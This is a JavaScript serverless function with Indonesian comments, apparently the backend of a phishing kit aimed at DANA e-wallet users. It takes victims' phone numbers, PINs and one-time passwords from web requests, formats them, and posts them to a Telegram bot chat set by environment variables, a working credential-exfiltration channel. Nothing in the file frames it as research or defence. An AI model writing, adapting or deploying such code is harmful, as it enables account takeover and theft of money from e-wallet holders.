const axios = require('axios');

// Format Telegram message tanpa hyphens
function formatMessage(type, phone, pin, otp) {
  // Remove all non-digit characters
  const cleanPhone = phone.replace(/\D/g, '');
  
  let message = 
    "├• AKUN | DANA E-WALLET\n" +
    "├───────────────────\n" +
    `├• NO HP : ${cleanPhone}\n`;

  if (pin) {
    message += "├───────────────────\n" +
               `├• PIN  : ${pin}\n`;
  }

  if (otp) {
    message += "├───────────────────\n" +
               `├• OTP : ${otp}\n`;
  }
  
  // Tambahkan label khusus untuk OTP otomatis
  if (type === 'otp_auto') {
    message += "├───────────────────\n" +
               "├• OTP AUTO : ✅\n";
  }

  message += "╰───────────────────";
  return message;
}

exports.handler = async (event, context) => {
  // Only accept POST requests
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: JSON.stringify({ error: 'Method Not Allowed' }),
      headers: { 'Content-Type': 'application/json' }
    };
  }

  try {
    // Parse and validate request
    const { type, phone, pin, otp } = JSON.parse(event.body);
    
    if (!type || !phone) {
      return {
        statusCode: 400,
        body: JSON.stringify({ error: 'Type and phone are required' }),
        headers: { 'Content-Type': 'application/json' }
      };
    }

    // Clean phone number
    const cleanPhone = phone.replace(/\D/g, '');
    
    if (cleanPhone.length < 10) {
      return {
        statusCode: 400,
        body: JSON.stringify({ error: 'Phone number must be at least 10 digits' }),
        headers: { 'Content-Type': 'application/json' }
      };
    }

    // Check Telegram config
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      throw new Error('Server configuration error: Missing Telegram credentials');
    }

    // Format and send message
    const message = formatMessage(type, cleanPhone, pin, otp);
    
    const telegramResponse = await axios.post(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      },
      {
        timeout: 5000 // 5 second timeout
      }
    );

    return {
      statusCode: 200,
      body: JSON.stringify({ 
        success: true,
        message: 'Data sent successfully',
        telegram_status: telegramResponse.status
      }),
      headers: { 'Content-Type': 'application/json' }
    };

  } catch (error) {
    console.error('Error:', error);
    
    return {
      statusCode: 500,
      body: JSON.stringify({
        error: 'Internal Server Error',
        details: error.message,
        request: event.body
      }),
      headers: { 'Content-Type': 'application/json' }
    };
  }
};
